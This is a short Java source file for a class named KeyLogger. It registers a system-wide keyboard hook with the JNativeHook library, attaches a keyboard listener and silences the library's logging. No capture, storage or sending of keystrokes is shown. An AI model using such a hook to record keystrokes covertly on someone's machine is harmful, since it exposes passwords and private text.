package Previous;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.logging.LogManager;

public class KeyLogger {
    public static NativeKeyBoard nativeKeyBoard;

    public void startKeyLogger(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        nativeKeyBoard = new NativeKeyBoard();
        GlobalScreen.addNativeKeyListener(nativeKeyBoard);
        LogManager.getLogManager().reset();
    }
}
